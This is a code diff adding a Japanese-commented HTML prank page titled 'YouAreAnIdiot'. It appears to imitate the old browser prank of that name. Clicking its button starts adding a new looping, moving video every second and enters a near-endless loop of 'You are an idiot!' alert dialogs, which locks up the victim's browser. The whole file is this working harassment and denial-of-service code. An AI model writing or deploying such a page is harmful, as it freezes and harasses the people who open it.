@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>YouAreAnIdiot</title>
+    <style>
+        body {
+            /* 背景を黒にして、動画が目立つように */
+            background-color: black; 
+            /* スクロールバーを非表示にし、画面いっぱいに */
+            overflow: hidden; 
+            margin: 0;
+            padding: 0;
+            color: white; /* ボタンの文字が見えるように */
+            font-family: sans-serif;
+            text-align: center;
+        }
+        .moving-video {
+            /* 動画を絶対位置で指定し、自由に配置できるように */
+            position: absolute; 
+            width: 200px; /* 動画のサイズを設定 */
+            height: auto;
+            /* 動きを滑らかにするための設定（オプション） */
+            transition: all 5s linear; 
+        }
+        #actionButton {
+            /* ボタンを画面上部に固定 */
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 10px 20px;
+            font-size: 20px;
+            cursor: pointer;
+            z-index: 1000; /* 動画より手前に表示 */
+            background-color: red;
+            color: white;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+
+<button id="actionButton" onclick="startChaos()">動画増殖と無限アラート開始</button>
+
+<script>
+    // 変更点: 動画ファイルのパスを新しいファイル名に変更しました
+    const videoSrc = '1762595624384.mp4'; 
+    
+    // ⏰ 動画を増やす間隔 (ミリ秒) - 1秒ごとに増やす
+    const videoInterval = 1000; 
+
+    /**
+     * 新しい動画要素を作成し、ランダムな位置に配置・再生する関数
+     */
+    function createAndPlayMovingVideo() {
+        // 新しい <video> 要素を作成
+        const video = document.createElement('video');
+        
+        // 必須の属性を設定
+        video.src = videoSrc;
+        video.className = 'moving-video';
+        
+        // ご要望の設定
+        video.loop = true;      // 永遠に繰り返して再生
+        video.muted = true;     // 自動再生のためにミュートは必須
+        video.autoplay = true;  // 自動再生
+        video.playsinline = true; // iOSなどでインライン再生させるための設定
+        
+        // 📏 ランダムな位置を計算
+        const screenWidth = window.innerWidth;
+        const screenHeight = window.innerHeight;
+        const videoSize = 200; 
+
+        // X座標 (0 から 画面幅 - 動画幅)
+        const randomX = Math.random() * (screenWidth - videoSize); 
+        // Y座標 (0 から 画面高さ - 動画高さ)
+        const randomY = Math.random() * (screenHeight - videoSize); 
+
+        // スタイルで位置を設定
+        video.style.left = `${randomX}px`;
+        video.style.top = `${randomY}px`;
+        
+        // ページに追加
+        document.body.appendChild(video);
+
+        // 🔊 再生開始
+        video.play().catch(error => {
+            console.warn('自動再生がブロックされました:', error);
+        });
+        
+        // ✨ 時間が経ったら位置をランダムに動かす（動画が移動）
+        setInterval(() => {
+            const newRandomX = Math.random() * (screenWidth - videoSize);
+            const newRandomY = Math.random() * (screenHeight - videoSize);
+            
+            video.style.left = `${newRandomX}px`;
+            video.style.top = `${newRandomY}px`;
+        }, 5000); // 5秒ごとに移動
+    }
+
+    /**
+     * 無限アラートを表示する関数
+     */
+    function buttonClick(){
+        // forループ内のiの値は非常に大きいため、実質的に無限に実行されます
+        for(let i = 9999999999999999999999; i > 0; i--){
+            alert("You are an idiot！");
+        }
+    }
+    
+    /**
+     * 両方の処理を開始する関数
+     */
+    function startChaos() {
+        // 1. 動画の無限増殖を開始
+        setInterval(createAndPlayMovingVideo, videoInterval);
+        
+        // 2. 無限アラートを開始
+        buttonClick(); 
+    }
+
+</script>
+</body>
+</html>
